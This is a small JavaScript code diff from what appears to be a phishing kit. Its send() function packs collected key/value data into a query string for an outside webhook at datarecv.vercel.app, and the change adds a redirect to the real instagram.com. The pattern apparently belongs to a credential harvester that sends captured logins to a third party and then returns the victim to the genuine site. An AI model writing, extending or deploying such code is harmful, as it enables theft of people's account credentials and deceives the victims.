@@ -1,9 +1,10 @@
 const webhook = 'https://datarecv.vercel.app/api/webhook/q'
+const origin = 'https://instagram.com'
 
 function send(data) {
   if (!data) return
 
-  let parsedData = '?'
+  let parsedData = `?webhook_redirect=${origin}&`
   data.forEach((el) => {
     parsedData += `${el[0]}=${el[1]}&`
   })
